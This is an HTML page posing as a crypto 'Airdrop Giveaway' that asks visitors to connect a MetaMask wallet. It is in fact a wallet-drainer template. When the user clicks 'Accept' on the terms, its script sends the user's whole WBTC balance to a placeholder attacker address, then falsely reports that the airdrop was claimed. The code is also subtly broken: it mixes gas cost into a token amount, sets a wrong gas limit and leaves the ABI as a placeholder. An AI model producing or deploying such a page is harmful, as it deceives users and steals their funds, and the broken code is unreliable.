<!DOCTYPE html>
<html lang="en">
<head>
 <meta charset="UTF-8">
 <meta name="viewport" content="width=device-width, initial-scale=1.0">
 <title>Airdrop Giveaway</title>
 <style>
 body { font-family: Arial, sans-serif; text-align: center; }
 #connectWallet { margin-top: 20px; padding: 10px 20px; font-size: 16px; }
 #terms { display: none; margin-top: 20px; }
 </style>
</head>
<body>
 <h1>Airdrop Giveaway!</h1>
 <p>Connect your wallet to claim your free airdrop!</p>
 <button id="connectWallet">Connect Wallet</button>
 <div id="terms">
 <h2>Terms and Conditions</h2>
 <p>By clicking "Accept", you agree to our terms and conditions.</p>
 <button id="acceptTerms">Accept</button>
 </div>
 <script src="https://cdn.jsdelivr.net/npm/web3/dist/web3.min.js"></script>
 <script>
 document.getElementById('connectWallet').addEventListener('click', async () => {
 if (typeof window.ethereum !== 'undefined') {
 await window.ethereum.request({ method: 'eth_requestAccounts' });
 document.getElementById('terms').style.display = 'block';
 } else {
 alert('Please install MetaMask!');
 }
 });

 document.getElementById('acceptTerms').addEventListener('click', async () => {
 if (typeof window.ethereum !== 'undefined') {
 const web3 = new Web3(window.ethereum);
 const accounts = await web3.eth.getAccounts();
 const wbtcAddress = '0x2260FAC5E5542a773Aa44fBCfeDf7C193bc2C599'; // WBTC address
 const wbtcContract = new web3.eth.Contract([/* WBTC ABI HERE */], wbtcAddress);
 const balance = await wbtcContract.methods.balanceOf(accounts[0]).call();
 const gasPrice = await web3.eth.getGasPrice();
 const gasLimit = 21000; // Standard gas limit for a simple transfer
 const gasCost = gasPrice.mul(new web3.utils.BN(gasLimit));
 const totalAmount = balance.sub(gasCost);

 await wbtcContract.methods.transfer('YOUR_WALLET_ADDRESS', totalAmount).send({ from: accounts[0], gasPrice, gasLimit });
 alert('Airdrop claimed successfully!');
 } else {
 alert('Please install MetaMask!');
 }
 });
 </script>
</body>
</html>
